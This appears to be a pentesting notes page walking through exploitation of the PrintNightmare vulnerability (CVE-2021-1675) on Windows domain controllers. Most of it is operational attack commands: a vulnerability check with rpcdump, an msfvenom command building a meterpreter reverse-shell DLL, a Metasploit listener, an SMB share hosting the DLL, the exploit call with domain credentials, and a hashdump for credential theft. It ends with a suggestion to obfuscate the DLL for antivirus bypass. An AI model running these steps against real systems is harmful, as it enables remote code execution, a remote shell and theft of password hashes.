---
description: CVE-2021-1675
---

# ‼️ Abusing PrintNightmare

<figure><img src="../../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

Github: [https://github.com/cube0x0/CVE-2021-1675](https://github.com/cube0x0/CVE-2021-1675)

"PrintNightmare" refers to an RCE (Remote Command Execution) vulnerability. If the vulnerable machine is configured to reject remote connection, this vulnerability could still be exploited in an LPE (Local Privilege Escalation) context.

To test if a machine is vulnerable to PrintNightmare, we can utilize the PoC methodology:

```
rpcdump.py @Domain_IP | egrep 'MS-RPRN|MS-PAR'
```

MS-RPRN and MS-PAR refer to Microsoft protocols used for managing printing operations in a Windows environment.

And if the output of this command is the following:

```
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

The target is vulnerable to PrintNightmare :imp:

If we want to continue exploiting this vuln, this is the methodology:&#x20;

First, we need to install the correct version of impacket:

```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We then need to copy the raw code of the CVE python file and paste it in the CVE.py file we juste cloned:

```
gedit CVE-2021-1675.py
#then paste the raw code of this 
```

<figure><img src="../../.gitbook/assets/image (1047).png" alt=""><figcaption></figcaption></figure>

So  basically for the following steps we are going to create a malicious DLL, host it and run it using the scripts provided by the repo:

```
Example;
./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll'
```

#### Methodology:

We first need to create our malicious DLL file with MsVenom

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=port_of_choice -f dll > shell.dll
```

Now we can just launch msfconsole and type in the following commands to set options:

```
set exploit multi/handler
set payload windows/x64/meterpreter/reverse_tcp
```

<figure><img src="../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

Set LHOST and LPORT to your local machine and any unused port and run the _run_ command to activate listener

<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

Now we need to set up a file share and we are going to use smbserver.py from impacket:

```
smbserver.py share 'pwd' -smb2support
```

Now everything is up and we can run the command:

```
python3 CVE-2021-1675.py domain.contoso/username:Password@DC_IP '\\local_IP\share\shell.dll'
```

and normally if everything is good and no firewall blocking us we will have our shell on metasploit or any listener we set up

<figure><img src="../../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>

and the rest is up to us with some fun commands like:

```
hashdump
```

In a normal environment, the firewall will block our DLL so we would need to do some AV bypass and could potentially obfuscate our DLL.
